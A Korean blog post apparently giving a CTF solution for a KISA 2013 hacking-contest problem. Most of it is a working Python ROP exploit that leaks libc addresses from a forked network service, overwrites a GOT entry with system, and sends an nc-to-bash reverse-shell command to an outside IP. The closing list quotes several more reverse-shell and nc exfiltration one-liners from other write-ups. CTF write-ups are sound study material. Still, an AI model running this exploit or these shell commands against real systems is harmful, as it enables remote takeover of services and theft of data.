---
layout: post
title: KISA 해킹방어대회 2013 5번(Luckyzzang)
comments: true
---

{% highlight python %}
import socket, struct
p  = lambda x: struct.pack('<L', x)
up = lambda x: struct.unpack('<L', x)[0]

command = 'nc 192.168.99.1 3334 | /bin/bash | nc 192.168.99.1 3333'

ppppr = p(0x080489cc)
sock_fd = p(4)
send_plt = p(0x08048610)
recv_plt = p(0x080485F0)
puts_plt = p()
puts_got = p()

buffer_size = 1032

HOST = '192.168.99.133'
PORT = 7777

puts_addr = 0xb759c190
'''
payload = send_plt + 'AAAA' + sock_fd + puts_got + p(4) + p(0)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

print s.recv(6)
s.send('D' * (buffer_size + 4) + payload)

puts_addr = up(s.recv(4))

print 'puts_addr = 0x%08x' % puts_addr

s.close()
'''

system_addr = puts_addr + 0xb7e583b0 - 0xb7e7e190
print 'system_addr = 0x%08x' % system_addr

my_buf = puts_addr + 0x144e70 + 0x946
print 'my_buf = 0x%08x' % my_buf

payload  = recv_plt + ppppr + sock_fd + puts_got + p(4) + p(0)
payload += recv_plt + ppppr + sock_fd + p(my_buf) + p(4) + p(0)
payload += send_plt + 'AAAA' + p(my_buf)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

print s.recv(6)
s.send('D' * (buffer_size + 4) + payload)

print 'system_addr send'
s.send(p(system_addr))

print 'command send'
s.send(command + '\x00')

print 'wait recv'
print s.recv(1024)

s.close()
{% endhighlight %}

문제를 푸는 방법은 정말 많지만 내가 풀 방법은 매우 간단한 ROP이다. 

첫번째로 할 일은 puts의 got값을 가져오는 것이다. 해당 ROP 값을 가져왔을 

코드를 보면 구지 2번을 puts를 구해오는 소켓 한개, 공격하는 소캣 한개 해서 총 2개를 한 이유는 사용가능한 payload의 길이 때문이다.

rand() % 100 + 1025 만큼이 recv를 해오는데 ret을 덮어 씌우기 위해선 1036의 dummy가 필요하다.

rand()에 따라 사이즈가 recv하는 크기가 변동하는데 그 범위는 1025 ~ 1124이다. 최대값인 1124에서 dummy를 제외하면 88byte가 최대라는 것이다. 

따라서 payload가 짧으면 짧을 수록 좋기 때문에 이렇게 했다고 말할 수 있다.

그리고 fork를 했을때 child는 parent의 aslr을 그대로 가져 오기 때문에 사용할 수 있는 방법인 것이다.

만약 이 문제에서 stack canary가 있었더라도 child가 갖는 stack canary가 parent의 canary와 같다는 것 때문에 충분히 풀 수 있을 것이다.

다른 사람들은 명령어를 담는 buffer를 bss를 이용했는데 나는 좀 무식하게... libc.so.6의 rw-p영역의 메모리를 사용했다...(libc의 함수 주소를 가져오니 그냥 사용해도 괜찮겠다 싶어서 그랫습니다..)

그리고 command의 경우는 예전에 BOB에서 배웠던 방식을 그대로 했던 것인데 다른 풀이를 봤을때는 다음과 같은 command가 있더라.

{% highlight python %}
cmd = "cat key>&4\x00" # <http://blog.tunz.kr/62>
cmd = "ls |nc <IP> 10101" # <http://yumere.tistory.com/entry/2013-HDCON-5%EB%B2%88-luckyzzang-exploit>
cmd = "nc 192.168.32.43 9090 |/bin/sh |nc 192.168.32.43 9091;" # <http://blog.sweetchip.kr/321> 헉
cmd = "/bin/sh -i <&4 >&4 2>&4" # <http://gooverto.tistory.com/entry/hdcon-luckyzzang-r2dl-exploit>
# 추가 제보 부탁드립니당 ㅎㅎ
{% endhighlight %}
